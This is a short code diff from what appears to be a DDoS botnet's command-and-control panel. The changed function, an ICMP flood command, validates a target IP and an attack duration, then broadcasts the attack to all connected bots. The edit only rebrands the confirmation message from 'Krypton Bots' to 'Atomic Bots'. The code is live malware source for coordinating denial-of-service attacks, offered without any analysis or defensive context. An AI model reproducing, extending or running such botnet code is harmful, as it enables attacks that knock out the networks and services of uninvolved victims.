@@ -25,7 +25,7 @@ def icmp(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, 
                 if validate_time(secs):
                     for x in xxxx.split('\n'):
                         send(client, '\x1b[3;31m'+ x)
-                    send(client, f" {Fore.LIGHTWHITE_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTWHITE_EX} sent to all Krypton Bots!\n")
+                    send(client, f" {Fore.LIGHTWHITE_EX}\nAttack {Fore.LIGHTGREEN_EX}successfully{Fore.LIGHTWHITE_EX} sent to all Atomic Bots!\n")
                     broadcast(data)
                 else:
                     send(client, Fore.RED + '\nInvalid attack duration (10-1300 seconds)\n')
